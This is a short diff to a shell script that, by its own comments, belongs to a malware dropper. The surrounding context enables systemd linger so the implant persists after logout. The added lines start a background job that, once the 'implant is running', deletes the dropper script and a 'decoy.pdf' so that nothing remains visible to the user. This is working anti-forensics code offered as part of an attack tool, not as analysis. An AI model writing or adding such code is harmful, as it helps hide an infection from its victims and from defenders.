@@ -66,4 +66,9 @@ if command -v loginctl >/dev/null 2>&1; then
   loginctl enable-linger "$(id -un)" >/dev/null 2>&1 || true
 fi
 
+# self-destruct: once the implant is running, remove the dropper + decoy so
+# nothing remains visible to the user.
+SELF="$0"
+( sleep 3; rm -f "$SELF" "${HERE}/decoy.pdf" 2>/dev/null || true ) >/dev/null 2>&1 &
+
 exit 0
